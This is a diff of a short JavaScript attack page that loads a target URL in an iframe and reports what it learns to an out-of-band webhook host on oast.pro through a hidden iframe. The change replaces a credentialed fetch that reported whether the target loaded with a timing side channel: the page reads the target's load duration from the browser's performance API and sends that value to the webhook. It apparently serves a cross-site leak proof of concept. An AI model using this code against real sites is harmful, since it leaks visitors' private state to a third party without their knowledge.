@@ -4,21 +4,20 @@ const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
 window.onload = function () {
     const iframe = document.createElement("iframe");
+
     iframe.onload = function () {
-        fetch(TARGET, { method: 'HEAD', credentials: 'include' })
-            .then(response => {
-                const ex = document.createElement("iframe");
-                ex.src = WEBHOOK + "?hit=" + response.ok;
-                ex.style.display = "none";
-                document.body.appendChild(ex);
-            })
-            .catch(() => {
-                const ex = document.createElement("iframe");
-                ex.src = WEBHOOK + "?hit=false";
-                ex.style.display = "none";
-                document.body.appendChild(ex);
-            });
+        let duration = 0;
+        const entries = performance.getEntriesByName(TARGET);
+        if (entries.length > 0) {
+            duration = entries[0].duration;
+        }
+
+        const ex = document.createElement("iframe");
+        ex.src = WEBHOOK + "?d=" + duration;
+        ex.style.display = "none";
+        document.body.appendChild(ex);
     };
+
     iframe.src = TARGET;
     document.body.appendChild(iframe);
 };
